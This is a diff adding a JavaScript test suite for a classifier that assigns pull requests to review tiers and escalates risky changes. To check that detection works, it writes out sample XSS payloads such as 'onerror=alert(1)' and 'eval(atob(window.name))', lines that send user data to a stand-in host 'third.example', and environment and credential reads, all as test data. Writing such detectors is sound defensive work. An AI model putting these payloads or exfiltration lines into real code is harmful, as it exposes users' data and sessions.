@@ -6333,3 +6333,315 @@ test('the records-only classifier and the mechanical sync check fail closed, eac
     await rm(dir, { recursive: true, force: true });
   }
 });
+
+// RFC-2026-030 (APPROVED IN PRINCIPLE 2026-10-08 by the Owner's `รับตามแนะนำทั้งหมด รวม RFC-030 ด้วย ลุยเลย`; final
+// text approved at merge): the review-tier classifier. Each rule is shown to bite in pure form, and the CLI on a
+// throwaway git repository returns each tier and exits 2 (= H) on an error. It only ever raises: nothing below proves
+// a lighter tier for a path the rules do not name. The first review round (C0 F1-F6, A1-1..A1-8, Q0 Q1-Q7, R0 R-1..R-4)
+// pinned each probe the reviewers measured as too light; each now classifies at the tier its finding asked for.
+import {
+  CLASSIFIERS, DATA_LINE_SIGNALS, H_IDENT_WORDS, H_LINE_SIGNALS, H_PATH_STEMS, H_PATH_WORDS, L_IMPORT_PACKAGES, L_PATHS, M_ELIGIBLE_MODULES, TIERS,
+  addedLines, classifyPath, classifyTier, formatReport, hPathHits, hSignals, importSpecs, lImportProblems, lineSignals, manifestNeutral, maxTier,
+  patchLines, pathWords,
+} from '../../scripts/db/classify-review-tier.mjs';
+
+test('the review-tier classifier fails closed to H and only ever raises, each rule biting (RFC-2026-030, approved in principle)', async () => {
+  assert.deepEqual(TIERS, ['records', 'L', 'M', 'H']);
+  assert.equal(maxTier('L', 'H', 'M'), 'H');
+  assert.equal(maxTier('records', 'L'), 'L');
+  assert.deepEqual(pathWords('src/modules/billing/ui/PlanCard.tsx'), ['src', 'modules', 'billing', 'ui', 'plan', 'card', 'tsx']);
+  // Acronym runs split (Q3): `APIClient` is `api client`, `getAPIKey` is `get api key`.
+  assert.deepEqual(pathWords('x/APIClient.ts'), ['x', 'api', 'client', 'ts']);
+  assert.deepEqual(pathWords('getAPIKey'), ['get', 'api', 'key']);
+  assert.ok(H_PATH_WORDS.length >= 80 && H_PATH_STEMS.length >= 60 && L_PATHS.length === 5 && H_LINE_SIGNALS.length === 9
+    && DATA_LINE_SIGNALS.length === 9 && H_IDENT_WORDS.includes('env'));
+  // The module allowlist is EMPTY on the base (A1-1): no module is M- or L-eligible until a governance PR names it.
+  assert.deepEqual([...M_ELIGIBLE_MODULES], []);
+  assert.ok(Object.isFrozen(M_ELIGIBLE_MODULES));
+  assert.deepEqual(L_IMPORT_PACKAGES, ['react']);
+  assert.deepEqual(CLASSIFIERS, ['scripts/db/classify-review-tier.mjs', 'scripts/db/classify-records-only.mjs']);
+
+  const blobs = {
+    mBase: JSON.stringify({ status: 'in_progress', open_blockers: ['a'], ownership: { branch: 'x', writable_paths: ['p'] } }),
+    mBranch: JSON.stringify({ status: 'in_review', open_blockers: ['a', 'b'], ownership: { branch: 'y', writable_paths: ['p'] } }),
+    mScope: JSON.stringify({ status: 'in_review', open_blockers: ['a'], ownership: { branch: 'y', writable_paths: ['p', 'q'] } }),
+    mLeap: JSON.stringify({ status: 'integration_verified', open_blockers: ['a'], ownership: { branch: 'y', writable_paths: ['p'] } }),
+  };
+  const text = (id) => { if (!(id in blobs)) throw new Error(`no blob ${id}`); return blobs[id]; };
+  const ch = (status, path, oldMode = '100644', newMode = '100644', oldBlob = 'o', newBlob = 'n') => ({ status, path, oldMode, newMode, oldBlob, newBlob });
+  const ui = 'src/modules/drafts/ui/DraftCard.tsx';
+  const uiCss = 'src/modules/drafts/ui/DraftCard.css';
+  const logic = 'src/modules/drafts/domain/score.ts';
+  const logicTest = 'src/modules/drafts/domain/score.test.ts';
+  const files = new Set([ui, uiCss, logic, logicTest, 'src/modules/drafts/ui/Badge.tsx', 'src/modules/drafts/ui/useDrafts.ts',
+    'apps/web/components/Hero.tsx', 'apps/web/lib/data.ts']);
+  const eligible = ['drafts', 'inbox'];
+  const tierOf = (changes, added = {}, removed = {}, mEligible = eligible) => classifyTier(changes, (c) => added[c.path] ?? [], text,
+    { removedOf: (c) => removed[c.path] ?? [], mEligible, files });
+
+  // L: presentational paths with no data path and no H signal (in an allowlisted module, or in the web app).
+  for (const p of [ui, 'src/modules/drafts/components/Badge.jsx', 'apps/web/components/Hero.tsx', 'apps/web/src/components/a/b.css',
+    'apps/web/messages/th.json', 'apps/web/styles/theme.scss', 'apps/web/public/img/logo.png']) {
+    const r = tierOf([ch('A', p, '000000')], { [p]: ['export const X = () => <div className="x" onClick={go}>สวัสดี</div>;'] });
+    assert.equal(r.tier, 'L', `${p}: ${r.reasons.join('; ')}`);
+  }
+  // L may import React and L files that exist at the head; an SVG namespace URL is not a request.
+  let r = tierOf([ch('M', ui)], { [ui]: ["import { useState } from 'react';", "import { Badge } from './Badge';", "import './DraftCard.css';",
+    '<svg xmlns="http://www.w3.org/2000/svg" />'] });
+  assert.equal(r.tier, 'L', r.reasons.join('; '));
+  // M: one allowlisted module's logic with its test.
+  r = tierOf([ch('M', logic), ch('A', logicTest, '000000')], { [logic]: ['export const score = (n) => n * 2;'] });
+  assert.equal(r.tier, 'M', r.reasons.join('; '));
+  assert.equal(r.module, 'drafts');
+  // Q7: a module test file under `ui/` is the module's test (M with a test), not an L file.
+  r = tierOf([ch('M', logic), ch('A', 'src/modules/drafts/ui/Card.test.tsx', '000000')], { [logic]: ['export const a = 1;'] });
+  assert.equal(r.tier, 'M', r.reasons.join('; '));
+  assert.equal(classifyPath(ch('A', 'src/modules/drafts/ui/Card.test.tsx', '000000'), [], text, { mEligible: eligible }).test, true);
+  // Neutral paths ride along without raising: an added or appended Markdown record, the handoff, VERIFICATION, a
+  // records-shaped manifest + branch slot, all of one package.
+  r = tierOf([ch('A', ui, '000000'), ch('A', 'evidence/WP-X/c0-review.md', '000000'), ch('M', 'evidence/WP-X/notes.md'),
+    ch('M', 'handoffs/WP-X-author-handoff.json'), ch('M', 'evidence/VERIFICATION.md'), ch('M', 'work-packages/WP-X.json', '100644', '100644', 'mBase', 'mBranch')],
+  { 'evidence/WP-X/notes.md': ['appended'] }, { 'evidence/VERIFICATION.md': ['old count'] });
+  assert.equal(r.tier, 'L', r.reasons.join('; '));
+  assert.deepEqual(r.statusMoves, ['in_progress -> in_review']);
+  assert.deepEqual(manifestNeutral(text('mBase'), text('mBranch')), []);
+  assert.ok(manifestNeutral(text('mBase'), text('mScope')).some((x) => /writable_paths: changed/.test(x)));
+  assert.deepEqual(manifestNeutral('{', '{}'), ['the manifest does not parse as JSON on both sides']);
+
+  // H, each rule alone.
+  const H = (changes, added, why, removed = {}, mEligible = eligible) => {
+    const got = tierOf(changes, added, removed, mEligible);
+    assert.equal(got.tier, 'H', `expected H for ${why}, got ${got.tier}: ${JSON.stringify(got.reasons)}`);
+    assert.ok(got.reasons.some((x) => why.test(x)), `${why}: ${JSON.stringify(got.reasons)}`);
+  };
+  H([ch('M', logic)], { [logic]: ['x'] }, /no test file of that module/);
+  H([ch('M', logic), ch('D', logicTest, '100644', '000000')], { [logic]: ['x'] }, /no test file of that module/);
+  // A JSON fixture under __tests__ is not a test (A1-7).
+  H([ch('M', logic), ch('A', 'src/modules/drafts/__tests__/fixture.json', '000000')], { [logic]: ['x'] }, /no test file of that module/);
+  H([ch('A', ui, '000000'), ch('A', 'src/modules/inbox/ui/List.tsx', '000000')], {}, /more than one module \(drafts, inbox\)/);
+  H([ch('M', 'work-packages/WP-X.json', '100644', '100644', 'mBase', 'mScope'), ch('A', ui, '000000')], {}, /writable_paths: changed/);
+  H([ch('A', 'evidence/WP-X/product-owner-disposition-x.md', '000000')], {}, /not records-only under RFC-2026-025/);
+  H([], {}, /empty diff/);
+  // A1-1: a module not on the allowlist is H -- and with the base's empty allowlist, every module is.
+  H([ch('A', 'src/modules/notes/ui/Card.tsx', '000000')], {}, /module notes is not on the reviewed module allowlist/);
+  H([ch('A', ui, '000000')], {}, /module drafts is not on the reviewed module allowlist/, {}, M_ELIGIBLE_MODULES);
+  // A1-4: a change to either classifier is H, whatever it prints.
+  for (const p of CLASSIFIERS) H([ch('M', p)], {}, /changes a tier classifier/);
+  // R-4: a status move past in_review in a non-records PR is H, and every move is reported.
+  H([ch('M', 'work-packages/WP-X.json', '100644', '100644', 'mBase', 'mLeap'), ch('A', ui, '000000')], {}, /in_progress -> integration_verified \(a move past in_review/);
+  // Q1, A1-8: evidence below H is a Markdown record of one package, added or appended to, never rewritten.
+  for (const p of ['evidence/WP-X/run.mjs', 'evidence/WP-X/m.sql', 'evidence/WP-X/.github/workflows/ci.yml', 'evidence/WP-X/deep/x.md']) {
+    H([ch('A', ui, '000000'), ch('A', p, '000000')], {}, /not an L or M path|an H word in the path/);
+  }
+  H([ch('A', ui, '000000'), ch('M', 'evidence/WP-X/c0-review.md')], { 'evidence/WP-X/c0-review.md': ['APPROVED'] }, /rewrites an existing record/,
+    { 'evidence/WP-X/c0-review.md': ['BLOCK'] });
+  H([ch('A', ui, '000000'), ch('A', 'evidence/WP-X/a.md', '000000'), ch('A', 'evidence/WP-OTHER/b.md', '000000')], {}, /records of more than one package \(WP-OTHER, WP-X\)/);
+  for (const p of ['db/foundation/migrations/175_x.sql', '.github/workflows/ci.yml', 'scripts/run-test-suite.mjs', 'contract-catalog/x.json',
+    'architecture/decisions/RFC-2026-030-risk-tiered-review.md', 'CONTRIBUTING_AGENTS.md', 'package.json', 'package-lock.json',
+    'test-kits/integrity-manifest.json', 'apps/web/app/page.tsx', 'apps/web/lib/x.ts', 'README.md', 'src/shared/x.ts', 'apps/web/public/i.svg']) {
+    H([ch('M', p)], {}, /not an L or M path|an H word in the path/);
+  }
+  for (const [p, w] of [['src/modules/billing/ui/Plan.tsx', 'billing'], ['src/modules/iam/domain/x.ts', 'iam'], ['src/modules/drafts/ui/PublishButton.tsx', 'publish'],
+    ['src/modules/drafts/ui/oauthPanel.tsx', 'oauth'], ['apps/web/components/auth/Login.tsx', 'auth'], ['src/modules/meta-connector/ui/x.tsx', 'meta'],
+    ['src/modules/drafts/server/x.ts', 'server'], ['src/modules/drafts/ui/secret-box.css', 'secret'], ['src/modules/drafts/db/x.ts', 'db'],
+    // The first round's probes (R-1, F2, Q3, A1-1, R-2, F4, F5): stems and joined words.
+    ['src/modules/drafts/domain/authorization.ts', 'authorization'], ['src/modules/drafts/domain/authentication.ts', 'authentication'],
+    ['src/modules/tenancy/domain/x.ts', 'tenancy'], ['src/modules/identity/domain/verify.ts', 'identity'], ['src/modules/drafts/ui/SignInForm.tsx', 'signin'],
+    ['src/modules/drafts/ui/LogoutButton.tsx', 'logout'], ['src/modules/drafts/ui/MfaPrompt.tsx', 'mfa'], ['src/modules/drafts/domain/jwtVerify.ts', 'jwt'],
+    ['src/modules/drafts/domain/csrf.ts', 'csrf'], ['src/modules/drafts/domain/oauth2.ts', 'oauth2'], ['src/modules/drafts/ui/PasskeyButton.tsx', 'passkey'],
+    ['src/modules/drafts/domain/sso.ts', 'sso'], ['src/modules/drafts/domain/otp.ts', 'otp'], ['src/modules/drafts/ui/CookieBanner.tsx', 'cookie'],
+    ['src/modules/invoices/domain/subscriptionRenewal.ts', 'invoices'], ['src/modules/drafts/domain/refund.ts', 'refund'],
+    ['src/modules/accounts/domain/x.ts', 'accounts'], ['src/modules/members/domain/x.ts', 'members'], ['src/modules/drafts/domain/encryption.ts', 'encryption'],
+    ['src/modules/scheduler/domain/x.ts', 'scheduler'], ['src/modules/uploads/domain/storage.ts', 'uploads'], ['src/modules/drafts/jobs/send.ts', 'jobs'],
+    ['src/modules/drafts/domain/queue.ts', 'queue'], ['src/modules/drafts/domain/purgeOld.ts', 'purge'], ['src/modules/drafts/domain/sendEmail.ts', 'email'],
+    ['src/modules/drafts/adapters/x.ts', 'adapters'], ['src/modules/drafts/package.json', 'package'], ['src/modules/drafts/tsconfig.json', 'tsconfig'],
+    ['src/modules/drafts/domain/APIClient.ts', 'api'], ['src/modules/drafts/domain/getAPIKey.ts', 'key']]) {
+    assert.ok(hPathHits(p).length > 0, p);
+    H([ch('M', p)], {}, new RegExp(`an H word in the path \\([^)]*${w}`));
+  }
+  for (const [line, why] of [['const k = process.env.KEY;', /environment/], ["const r = 'service_role';", /privileged database credential/],
+    ['const apiKey = 1;', /names a secret/], ['create policy p on t', /changes schema/], ['grant select on t to x', /changes a grant/],
+    ['alter table t enable row level security', /schema|RLS/], ['stripe.charges.create()', /payment, webhook or OAuth/],
+    ['<div dangerouslySetInnerHTML={x} />', /code-injection/], ['eval("1")', /code-injection/],
+    // F3, A1-3, Q2, R-3: the sinks the first round measured as L.
+    ['ref.current.innerHTML = html', /code-injection/], ['el.insertAdjacentHTML("beforeend", s)', /code-injection/], ['document.write(s)', /code-injection/],
+    ['<a href="javascript:alert(1)">x</a>', /code-injection/], ['<svg onload="alert(1)" />', /event-handler attribute/],
+    ['"t": "<img src=x onerror=alert(1)>"', /event-handler attribute/], ['setTimeout("doIt()", 1)', /code-injection/], ['<foreignObject>', /code-injection/],
+    // A1-2, Q3: identifiers split into sub-words.
+    ['const h = hashPassword(p);', /identifier \(password\)/], ['const c = stripeClient.charges;', /identifier \(stripe\)/],
+    ['const k = userApiKey;', /identifier \(apikey\)/], ['const s = webhookSecret;', /identifier \([^)]*secret/], ['const t = await getAccessToken();', /identifier \(accesstoken\)/],
+    ['const s = env.DB_PASSWORD;', /identifier \([^)]*password/], ['oauth_client_id', /payment, webhook or OAuth|identifier/],
+    ['const x = process["env"].X', /environment/], ['const {env} = process; env.X', /environment/], ['Deno.env.get("X")', /environment/]]) {
+    H([ch('M', ui)], { [ui]: [line] }, why);
+    H([ch('M', logic), ch('M', logicTest)], { [logic]: [line] }, why);
+  }
+  assert.deepEqual(hSignals(['export const ok = () => <Button onClick={save} key={id} />;']), []);
+  // Q5: an added line whose own text starts with `++` is read.
+  H([ch('M', ui)], { [ui]: patchLines('diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n+++i; eval(atob(window.name));\n').added }, /code-injection/);
+  H([ch('M', 'apps/web/components/Feed.tsx')], { 'apps/web/components/Feed.tsx': ['fetch("/x")'] }, /not L outside a module/);
+  H([ch('R', `${ui} -> ${ui}x`)], {}, /status R/);
+  H([ch('M', ui, '100644', '100755')], {}, /mode 100644 -> 100755/);
+  H([ch('A', ui, '000000', '120000')], {}, /mode 000000 -> 120000/);
+  H([ch('D', 'apps/web/components/Old.tsx', '100644', '000000')], {}, /deletion outside a module/);
+  H([ch('D', 'evidence/WP-X/session-x.md', '100644', '000000'), ch('A', ui, '000000')], {}, /deleted record/);
+  H([ch('A', 'work-packages/WP-Z.json', '000000')], {}, /manifest added or removed/);
+  // F5: a module importing another module's internals is H.
+  H([ch('M', logic), ch('M', logicTest)], { [logic]: ["import { send } from '../../mailer/domain/send';"] }, /imports module mailer/);
+  H([ch('M', logic), ch('M', logicTest)], { [logic]: ["import { x } from '@/modules/inbox/domain/x';"] }, /imports module inbox/);
+  // F6, A1-6: removed lines are read. A removed guard in module logic is H; an L file that removes lines is not L.
+  H([ch('M', logic), ch('M', logicTest)], { [logic]: ['return go();'] }, /removes a guard-shaped line/, { [logic]: ["if (!flags.drafts) return null;"] });
+  H([ch('M', logic), ch('M', logicTest)], {}, /removes a guard-shaped line/, { [logic]: [".eq('tenant_id', tenantId)"] });
+  H([ch('M', 'apps/web/components/Hero.tsx')], {}, /removes lines/, { 'apps/web/components/Hero.tsx': ['{flag && <New />}'] });
+  r = tierOf([ch('M', ui), ch('M', logicTest)], {}, { [ui]: ['<p>old</p>'] });
+  assert.equal(r.tier, 'M', r.reasons.join('; '));
+  assert.ok(r.reasons.some((x) => /removes lines/.test(x)));
+
+  // A data path in a module's UI is not L: it is M, and then M's test rule applies. F1, A1-3, Q2, R-3: imports are the
+  // commonest data path, so an L file imports only React and L files that exist at the head.
+  for (const [line, why] of [['await fetch(url)', /network call/], ["'use server'", /server code/], ["import { x } from '@supabase/supabase-js'", /database client/],
+    ["const u = '/api/drafts'", /API route/], ['localStorage.setItem(a, b)', /browser storage/],
+    ["import { deleteAccount } from '../../../../apps/web/app/actions';", /resolves to no file|not an L path/], ["import { useDrafts } from './useDrafts';", /not an L path/],
+    ["import { useMutation } from '@tanstack/react-query';", /imports @tanstack\/react-query/], ["import { getMe } from '@/lib/data';", /imports @\/lib\/data/],
+    ['const m = await import("../lib/data")', /dynamic import/], ['<form action={save}>', /form action/],
+    ['<img src={`https://third.example/p?u=${user.email}`} />', /absolute URL/], ['new Image().src = "https://third.example/b?d=" + d;', /absolute URL|browser channel/],
+    ['window.location.href = next', /browser channel/], ['window.parent.postMessage(data, "*")', /browser channel/], ['<iframe src={u} />', /browser channel/],
+    ['navigator.geolocation.getCurrentPosition(cb)', /browser channel/], ["window['fe' + 'tch'](u)", /browser channel/], ['sb.from(TABLE)', /database client/],
+    ['@import url("https://third.example/x.css");', /absolute URL|imports https/]]) {
+    r = tierOf([ch('M', ui), ch('M', logicTest)], { [ui]: [line] });
+    assert.equal(r.tier, 'M', `${line}: ${r.reasons.join('; ')}`);
+    assert.ok(r.reasons.some((x) => why.test(x)), `${line}: ${JSON.stringify(r.reasons)}`);
+    H([ch('M', ui)], { [ui]: [line] }, /no test file of that module/);
+  }
+  assert.deepEqual(lImportProblems(ui, ["import x from './Nope';"], files), ["imports ./Nope, which resolves to no file at the head"]);
+  assert.deepEqual(lImportProblems(ui, ["import x from './Badge';"], null), ["imports ./Badge, which resolves to no file at the head"]);
+  assert.equal(tierOf([ch('M', ui)], { [ui]: ['const a = Array.from(xs);'] }).tier, 'L');
+  // C0 N1, A1-R1, Q0 QR1, R0 R-9: an import split over lines (the formatter's shape), with comments -- even one holding a
+  // quote -- between its braces, is read as a whole; so is the file at the head, where a binding added inside an existing
+  // multi-line import adds no line that names the module.
+  assert.deepEqual(importSpecs(['import {', '  getMe, // the user\'s', '} from', "  '@/lib/data';", "export { a } from /* x */ './A';",
+    "import /* y */ './B.css';"]), ['@/lib/data', './A', './B.css']);
+  for (const lines of [['import {', '  deleteDraft,', "} from '../lib/delete-draft';"], ['import {', '  getMe,', "} from '@/lib/data';"],
+    ['import {', '  getMe, // the user\'s', "} from '@/lib/data';"], ["import { getMe } from /* c */ '@/lib/data';"],
+    ['import {', '  useMutation,', "} from '@tanstack/react-query';"], ['export {', '  save,', "} from '../actions';"]]) {
+    r = tierOf([ch('M', ui), ch('M', logicTest)], { [ui]: lines });
+    assert.equal(r.tier, 'M', `${lines.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.ok(r.reasons.some((x) => /imports /.test(x)), `${lines.join(' / ')}: ${JSON.stringify(r.reasons)}`);
+    H([ch('M', 'apps/web/components/Hero.tsx')], { 'apps/web/components/Hero.tsx': lines }, /not L outside a module/);
+  }
+  H([ch('M', logic), ch('M', logicTest)], { [logic]: ['import {', '  send,', "} from '../../mailer/domain/send';"] }, /imports module mailer/);
+  H([ch('M', logic), ch('M', logicTest)], { [logic]: ['import {', '  x,', '} from', "  '@/modules/inbox/domain/x';"] }, /imports module inbox/);
+  const withHead = (changes, added, head) => classifyTier(changes, (c) => added[c.path] ?? [], text, { files, mEligible: eligible, headOf: (c) => head[c.path] ?? [] });
+  r = withHead([ch('M', ui), ch('M', logicTest)], { [ui]: ['  getMe,'] }, { [ui]: ['import {', '  getMe,', '  other,', "} from '@/lib/data';", 'export const A = 1;'] });
+  assert.equal(r.tier, 'M', r.reasons.join('; '));
+  assert.ok(r.reasons.some((x) => /imports @\/lib\/data/.test(x)), JSON.stringify(r.reasons));
+  r = withHead([ch('M', logic), ch('M', logicTest)], { [logic]: ['  send,'] }, { [logic]: ['import {', '  send,', "} from '../../mailer/domain/send';"] });
+  assert.equal(r.tier, 'H', r.reasons.join('; '));
+  assert.ok(r.reasons.some((x) => /imports module mailer/.test(x)), JSON.stringify(r.reasons));
+  assert.equal(withHead([ch('M', ui)], { [ui]: ['<p>new</p>'] }, { [ui]: ["import { Badge } from './Badge';", '<p>new</p>'] }).tier, 'L');
+  // Q0 QR3: five fail-open mutants, pinned. (1) every resolved target must be L; (2) packages match exactly; (3) a removed
+  // line carrying an H signal is H in module logic even without a guard shape; (4) the handoff's package counts for the
+  // one-package rule; (5) `process[` alone reads the environment.
+  assert.deepEqual(lImportProblems('apps/web/components/Badge.tsx', ["import { Hero } from './Hero';"],
+    new Set(['apps/web/components/Hero.tsx', 'apps/web/components/Hero.ts'])).length, 1);
+  for (const pkg of ['react-dom/server', 'react-query', 'react/../x']) {
+    r = tierOf([ch('M', ui), ch('M', logicTest)], { [ui]: [`import x from '${pkg}';`] });
+    assert.equal(r.tier, 'M', `${pkg}: ${r.reasons.join('; ')}`);
+  }
+  H([ch('M', logic), ch('M', logicTest)], {}, /removes a guard-shaped line/, { [logic]: ['if (process.env.X) return;'] });
+  H([ch('A', ui, '000000'), ch('A', 'evidence/WP-X/a.md', '000000'), ch('M', 'handoffs/WP-OTHER-author-handoff.json')], {}, /records of more than one package \(WP-OTHER, WP-X\)/);
+  H([ch('M', ui)], { [ui]: ["const v = process['e' + 'nv'].X;"] }, /reads the environment/);
+  // Records-only keeps RFC-2026-025 §6, unchanged.
+  r = tierOf([ch('A', 'evidence/WP-X/session-2026-10-08.md', '000000')]);
+  assert.equal(r.tier, 'records');
+  // A deletion inside a module is M at least, never L.
+  r = tierOf([ch('D', ui, '100644', '000000'), ch('M', logicTest)]);
+  assert.equal(r.tier, 'M', r.reasons.join('; '));
+  // Signals only read text files: a PNG's bytes are not scanned, and its path still has to be L.
+  assert.equal(classifyPath(ch('A', 'apps/web/public/a.png', '000000'), ['process.env'], text).tier, 'L');
+  assert.deepEqual(lineSignals(['fine'], H_LINE_SIGNALS), []);
+  assert.deepEqual(addedLines('diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n+one\n-two\n+three\n'), ['one', 'three']);
+  assert.deepEqual(addedLines('+++ b/x\n+one\n'), [], 'nothing before the first hunk is a line of the file');
+  assert.deepEqual(patchLines('@@ -1 +1 @@\n-two\n+three\n'), { added: ['three'], removed: ['two'] });
+  assert.throws(() => classifyTier([ch('M', 'work-packages/WP-X.json', '100644', '100644', 'missing', 'mBase')], () => [], text), /no blob/,
+    'an unreadable blob throws, which the CLI turns into exit 2 (= H)');
+  // The report: L names both of the Reviewer's written confirmations; the copy note and every status move are printed.
+  const rep = formatReport({ tier: 'L', paths: [ui], reasons: [], mergeBase: 'a'.repeat(40), head: 'b'.repeat(40), module: 'drafts', statusMoves: ['x -> y'], copy: 'classifier copy: z' });
+  assert.match(rep[0], /^tier: L \(1 path\(s\), aaaaaaa\.\.bbbbbbb, module drafts\)$/);
+  assert.ok(rep.some((l) => /behind a feature flag AND has no data path: the Reviewer confirms both in writing/.test(l)));
+  assert.ok(rep.includes('  status move for the reader to check against its role verdict: x -> y') && rep.includes('  classifier copy: z'));
+
+  // The CLI, end to end, on a throwaway repository whose base carries this classifier (so the copy is the base's), and
+  // from an earlier base that does not (so it is not).
+  const cli = join(process.cwd(), 'scripts/db/classify-review-tier.mjs');
+  const dir = await mkdtemp(join(tmpdir(), 'review-tier-'));
+  try {
+    const env = { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 'review-tier-test', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 'review-tier-test', GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' };
+    delete env.GIT_DIR;
+    delete env.GIT_WORK_TREE;
+    delete env.GIT_INDEX_FILE;
+    const g = (...a) => run('git', ['-c', 'commit.gpgsign=false', '-c', 'init.defaultBranch=main', ...a], { cwd: dir, env });
+    const put = (p, c) => mkdir(join(dir, p, '..'), { recursive: true }).then(() => writeFile(join(dir, p), c));
+    const commit = async (m) => { await g('add', '-A'); await g('commit', '-q', '-m', m); return (await g('rev-parse', 'HEAD')).stdout.trim(); };
+    const out = async (...a) => { try { const x = await run(process.execPath, [cli, ...a], { cwd: dir, env }); return [0, x.stdout]; } catch (e) { return [e.code, e.stdout + e.stderr]; } };
+    const hero = 'apps/web/components/Hero.tsx';
+    await g('init', '-q');
+    await put('notes.txt', 'pre\n');
+    const pre = await commit('pre');
+    for (const p of CLASSIFIERS) await put(p, await readFile(join(process.cwd(), p)));
+    await put(hero, 'export const Hero = () => <div>old</div>;\n');
+    await put(logic, 'export const score = (n) => n;\n');
+    await put(logicTest, 'test\n');
+    const root = await commit('base');
+    await g('checkout', '-q', '-b', 'l');
+    await put('apps/web/components/Badge.tsx', "import { Hero } from './Hero';\nexport const Badge = () => <Hero />;\n");
+    await commit('ui');
+    let [code, o] = await out('main', 'l');
+    assert.equal(code, 0, o);
+    assert.match(o, /^tier: L \(1 path\(s\)/);
+    assert.match(o, /behind a feature flag AND has no data path/);
+    assert.match(o, /classifier copy: the base's/);
+    [code, o] = await out(pre, 'l');
+    assert.equal(code, 0, o);
+    assert.match(o, /^tier: H /, o);
+    assert.match(o, /changes a tier classifier/);
+    assert.match(o, /classifier copy: NOT the base's/);
+    await g('checkout', '-q', '-b', 'ml', root);
+    await put('apps/web/lib/data.ts', 'export const getMe = () => 1;\n');
+    await commit('lib');
+    await g('checkout', '-q', 'l');
+    await g('merge', '-q', '--no-edit', 'ml');
+    await put('apps/web/components/Me.tsx', "import {\n  getMe,\n} from '../lib/data';\nexport const Me = () => <p>{getMe()}</p>;\n");
+    await commit('multi-line import');
+    [code, o] = await out('ml', 'l');
+    assert.equal(code, 0, o);
+    assert.match(o, /^tier: H /, o);
+    assert.match(o, /imports \.\.\/lib\/data \(apps\/web\/lib\/data\.ts: not an L path\)/, o);
+    await put(hero, 'export const Hero = () => <div>new</div>;\n');
+    await commit('rewrite');
+    [code, o] = await out('main', 'l');
+    assert.equal(code, 0, o);
+    assert.match(o, /^tier: H /, o);
+    assert.match(o, /removes lines/);
+    await g('checkout', '-q', '-b', 'm', root);
+    await put(logic, 'export const score = (n) => n * 2;\n');
+    await put(logicTest, 'test 2\n');
+    await commit('logic');
+    [code, o] = await out('main', 'm');
+    assert.equal(code, 0, o);
+    assert.match(o, /^tier: H /, o);
+    assert.match(o, /module drafts is not on the reviewed module allowlist/);
+    await put('apps/web/components/Footer.tsx', 'export const Footer = () => <div>{process.env.X}</div>;\n');
+    await commit('env');
+    [code, o] = await out('main', 'm');
+    assert.equal(code, 0, o);
+    assert.match(o, /^tier: H /, o);
+    assert.match(o, /reads the environment/);
+    [code, o] = await out('main', 'no-such-ref');
+    assert.equal(code, 2, `an unknown ref is not classified, which is H: ${o}`);
+    assert.match(o, /not classified, which is H \(fail closed\)/);
+    [code, o] = await out('--sync', root);
+    assert.equal(code, 2, o);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
